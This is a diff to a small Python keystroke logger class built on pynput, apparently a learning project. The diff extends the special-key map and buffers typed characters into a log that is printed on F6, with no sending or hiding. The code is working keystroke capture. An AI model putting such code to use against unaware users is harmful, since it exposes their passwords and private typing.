@@ -7,7 +7,10 @@ from pynput.keyboard import Key
 class Keylogger:
     def __init__(self):
         self.log = ""
-    
+        self.exit_event = asyncio.Event()  
+
+
+
     def on_press(self,key):
         special_keys = {
             Key.enter: 'Enter',
@@ -16,17 +19,52 @@ class Keylogger:
             Key.tab: 'Tab',
             Key.backspace: 'Backspace',
             Key.shift: 'Shift',
+            Key.shift_r: 'Shift',
             Key.ctrl: 'Ctrl',
+            Key.ctrl_r: 'Ctrl',
             Key.alt: 'Alt',
+            Key.alt_r:'Alt',
             Key.cmd: 'Cmd',
-            # Agrega más teclas especiales según sea necesario
+            Key.cmd_r: 'Cmd',
+            Key.caps_lock: 'Bloq Mayus',
+            Key.f1 : 'F1',
+            Key.f2 : 'F2',
+            Key.f3 : 'F3',
+            Key.f4 : 'F4',
+            Key.f5 : 'F5',
+            Key.f6 : 'F6',
+            Key.f7 : 'F7',
+            Key.f8 : 'F8',
+            Key.f9 : 'F9',
+            Key.f10 : 'F10',
+            Key.f11 : 'F11',
+            Key.f12 : 'F12',
         }
         if key in special_keys:
-            print(f'Special Key Pressed: {special_keys[key]}')
+            if special_keys[key] == 'Space':
+                self.log+=' '
+
+            elif special_keys[key] == 'Backspace':
+                self.log = self.log[0:-1]
+
+            elif special_keys[key] == 'Enter':
+                self.log += '\n'
+            
+            elif special_keys[key] == 'F6':
+                if self.log == '':
+                    self.exit_event.set()
+                print(self.log)
+                self.log=''
+            
+            else:
+                self.log+= f'[{special_keys[key].upper()}]'
+            
         else:
             try:
                 char = key.char
-                print(f'on_press {char}')
+                if char:
+                    self.log+=char
+                
             except AttributeError:
                 print(f'on_press {key} type: {type(key)}')
 
